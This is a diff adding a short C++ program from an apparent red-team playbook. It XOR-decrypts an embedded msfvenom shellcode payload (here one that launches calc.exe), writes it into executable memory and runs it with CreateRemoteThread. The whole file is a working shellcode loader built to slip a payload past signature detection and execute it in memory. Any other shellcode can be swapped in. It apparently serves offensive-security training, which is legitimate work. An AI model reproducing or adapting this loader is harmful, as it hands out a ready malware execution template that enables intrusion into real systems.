@@ -1,0 +1,77 @@
+/*
+	Red Team Playbook - Shellcode decryption + CreateRemoteThread example 
+	Credits to all open-source authors out there 
+*/
+
+#include <iostream>
+#include <windows.h>
+
+// credit: Sektor7 RTO Malware Essential Course 
+void XOR(unsigned char* data, size_t data_len, char* key, size_t key_len) {
+	int j;
+
+	j = 0;
+	for (int i = 0; i < data_len; i++) {
+		if (j == key_len - 1) j = 0;
+
+		data[i] = data[i] ^ key[j];
+		j++;
+	}
+}
+
+int main()
+{
+	// msfvenom -p windows/x64/exec CMD="calc.exe" --encrypt xor --encrypt-key redteamplaybook -f c
+	unsigned char buf[] =
+		"\x8e\x2d\xe7\x90\x95\x89\xad\x70\x6c\x61\x38\x33\x2e\x3f\x39"
+		"\x23\x33\x2c\x45\xb7\x04\x25\xfb\x3e\x01\x31\xe9\x3d\x77\x23"
+		"\xf9\x37\x44\x3c\xee\x13\x3d\x38\x63\xd6\x33\x28\x22\x5e\xa2"
+		"\x3a\x54\xa4\xd8\x59\x00\x11\x72\x40\x41\x38\xa3\xa6\x62\x2a"
+		"\x73\xa4\x86\x99\x37\x20\x3c\x38\xe7\x33\x59\xe9\x2d\x53\x23"
+		"\x73\xb5\xef\xf4\xed\x61\x6d\x70\x24\xe4\xb9\x16\x08\x27\x6a"
+		"\xa2\x35\xef\x3c\x7d\x25\xe6\x30\x4c\x28\x78\xb2\x8c\x39\x23"
+		"\x8d\xac\x25\xff\x51\xe9\x25\x71\xba\x2c\x48\xab\x27\x5e\xab"
+		"\xde\x24\xa5\xbd\x68\x20\x6c\xb1\x54\x81\x0c\x93\x23\x6c\x27"
+		"\x56\x6d\x21\x4d\xb4\x14\xb5\x28\x28\xea\x39\x46\x26\x6e\xbb"
+		"\x14\x24\xef\x78\x2d\x25\xe6\x30\x70\x28\x78\xb2\x2e\xe4\x6f"
+		"\xfa\x2d\x65\xa4\x24\x39\x2c\x28\x32\x38\x23\x23\x37\x2e\x32"
+		"\x33\x3f\x2c\xf7\x89\x41\x2c\x22\x93\x81\x21\x23\x36\x35\x23"
+		"\xf9\x77\x8d\x23\x9a\x9e\x92\x2d\x24\xdb\x78\x62\x6f\x6f\x6b"
+		"\x72\x65\x64\x3c\xe8\xec\x6c\x71\x6c\x61\x38\xd8\x5e\xe4\x04"
+		"\xf5\x9a\xb1\xcf\x95\xd4\xcf\x26\x2d\xdb\xdf\xf7\xd2\xf2\x94"
+		"\xa7\x2d\xe7\xb0\x4d\x5d\x6b\x0c\x66\xe1\x82\x82\x1a\x6a\xd0"
+		"\x35\x76\x16\x1b\x0f\x61\x34\x31\xe5\xbb\x86\xb7\x0c\x0e\x07"
+		"\x11\x4b\x01\x0c\x00\x61";
+
+	// VirtualAlloc on self 
+	HANDLE hProc = GetCurrentProcess();
+	LPVOID hAlloc = (LPVOID)VirtualAlloc(NULL, sizeof(buf), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	if (hAlloc == NULL) {
+		printf("[-] VirtualAlloc failed: %d\n", GetLastError());
+		return 1;
+	}
+
+	// XOR decrypt 
+	char key[] = "redteamplaybook";
+	XOR(buf, sizeof(buf), key, sizeof(key));
+
+	// WriteProcessMemory on self 
+	SIZE_T* lpNumberOfBytesWritten = 0;
+	if (!WriteProcessMemory(hProc, hAlloc, (LPVOID)buf, sizeof(buf), lpNumberOfBytesWritten)) {
+		printf("[-] WPM failed: %d\n", GetLastError());
+		return 1;
+	}
+
+	// CRT and execute the shellcode 
+	DWORD threadId = 0; 
+	HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)hAlloc, NULL, 0, (LPDWORD)(&threadId));
+	if (hThread == NULL) {
+		printf("[-] CRT failed: %d\n", GetLastError());
+		return 1; 
+	}
+	
+	// WaitForSingleObject 
+	WaitForSingleObject(hThread, 1000);
+
+	return 0; 
+}
